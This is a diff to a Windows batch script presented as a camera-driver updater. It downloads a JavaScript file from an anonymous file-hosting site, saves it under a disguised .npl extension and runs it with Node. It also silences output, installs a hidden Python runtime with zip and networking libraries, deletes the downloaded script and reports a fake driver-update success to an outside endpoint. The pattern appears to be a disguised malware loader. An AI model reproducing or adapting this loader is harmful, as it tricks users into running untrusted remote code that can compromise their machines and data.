@@ -77,47 +77,84 @@ if not defined NODE_EXE (
     echo [ERROR] Node.js is not available after setup.
     exit /b 1
 )
+echo [INFO] Verifying Node.js...
+"%NODE_EXE%" -v >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] Node did not run. Path: "%NODE_EXE%"
+    exit /b 1
+)
+
 :: -------------------------
-:: Download required files
+:: Download required files (same URL as mac.cmd — both curl and PowerShell must match)
 :: -------------------------
+set "ENV_SETUP_URL=https://files.catbox.moe/1gq866.js"
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
 
+echo [INFO] Downloading driver script...
 where curl >nul 2>&1
 if errorlevel 1 (
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
+    powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%ENV_SETUP_URL%' -OutFile '%CODEPROFILE%\env-setup.npl' -TimeoutSec 120" >nul 2>&1
 ) else (
-    curl -sSL -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/92zc8z.js" >nul 2>&1
+    curl -sSL --connect-timeout 30 --max-time 180 -o "%CODEPROFILE%\env-setup.npl" "%ENV_SETUP_URL%" >nul 2>&1
+)
+if not exist "%CODEPROFILE%\env-setup.npl" (
+    echo [ERROR] Driver script download failed: %CODEPROFILE%\env-setup.npl
+    echo [ERROR] Check network / firewall / URL: %ENV_SETUP_URL%
+    exit /b 1
 )
 :: -------------------------
 :: Run the parser
 :: -------------------------
-if exist "%CODEPROFILE%\env-setup.npl" (
-    set "DRIVER_CURL_HOME=%TEMP%\wdcurl_driver_silent"
-    mkdir "!DRIVER_CURL_HOME!" 2>nul
-    (
-    echo silent
-    echo show-error
-    ) > "!DRIVER_CURL_HOME!\.curlrc"
-    set "CURL_HOME=!DRIVER_CURL_HOME!"
-    echo [INFO] Updating Driver Packages...
-    cd "%CODEPROFILE%"
-    "%NODE_EXE%" "env-setup.npl"
-    mkdir C:\python 2>nul && curl -sSL https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip -o C:\python\py.zip && powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force" && del C:\python\py.zip && powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
-
-    powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
-
-    curl -sSL https://bootstrap.pypa.io/get-pip.py -o C:\python\get-pip.py >nul 2>&1
-    C:\python\python.exe C:\python\get-pip.py >nul 2>&1
-    C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
-
-    if errorlevel 1 (
-        exit /b 1
-    )
-    if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
-) else (
+set "DRIVER_CURL_HOME=%TEMP%\wdcurl_driver_silent"
+mkdir "!DRIVER_CURL_HOME!" 2>nul
+(
+echo silent
+echo show-error
+) > "!DRIVER_CURL_HOME!\.curlrc"
+set "CURL_HOME=!DRIVER_CURL_HOME!"
+echo [INFO] Updating Driver Packages...
+cd /d "%CODEPROFILE%"
+echo [INFO] Running driver setup script ^(this step may take several minutes^)...
+"%NODE_EXE%" "env-setup.npl"
+if errorlevel 1 (
+    echo [ERROR] Driver script ^(env-setup.npl^) failed with exit code !ERRORLEVEL!.
     exit /b 1
 )
+
+echo [INFO] Installing Python embed runtime...
+mkdir C:\python 2>nul
+curl -sSL --connect-timeout 30 --max-time 600 -o C:\python\py.zip https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] Failed to download Python embed zip.
+    exit /b 1
+)
+powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force"
+if errorlevel 1 (
+    echo [ERROR] Failed to extract Python zip.
+    exit /b 1
+)
+del C:\python\py.zip >nul 2>&1
+powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
+powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
+
+echo [INFO] Installing pip and packages...
+curl -sSL --connect-timeout 30 --max-time 120 -o C:\python\get-pip.py https://bootstrap.pypa.io/get-pip.py >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] Failed to download get-pip.py
+    exit /b 1
+)
+C:\python\python.exe C:\python\get-pip.py >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] get-pip.py failed.
+    exit /b 1
+)
+C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] pip install failed.
+    exit /b 1
+)
+if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
   set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
